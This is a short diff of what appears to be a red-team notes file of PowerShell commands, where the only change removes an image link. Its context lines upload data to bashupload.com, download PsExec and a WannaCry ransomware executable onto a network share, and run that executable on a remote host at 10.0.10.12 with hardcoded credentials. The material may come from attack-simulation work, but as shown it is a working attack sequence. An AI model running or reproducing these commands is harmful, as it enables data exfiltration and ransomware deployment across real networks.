@@ -45,5 +45,4 @@ Invoke-WebRequest -Uri https://bashupload.com -Method Post -ContentType multipar
 	Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "C:\Users\Public\PSTools.zip"; Expand-Archive -Path "C:\Users\Public\PSTools.zip" -DestinationPath "C:\Users\Public\";
 	Invoke-WebRequest -Uri https://github.com/limiteci/WannaCry/raw/main/WannaCry.EXE -OutFile \\10.0.10.12\confidential\wcry.exe;
 	CMD: C:\Users\Public\PsExec.exe -s -accepteula \\10.0.10.12 -u trendmicro -p trendmicro C:\confidential\wcry.exe
-![imagen](https://github.com/jmorales79/Tools-Red-Team/assets/149610204/639fe2cc-4b70-4afa-bdf8-94564c7fe648)
 
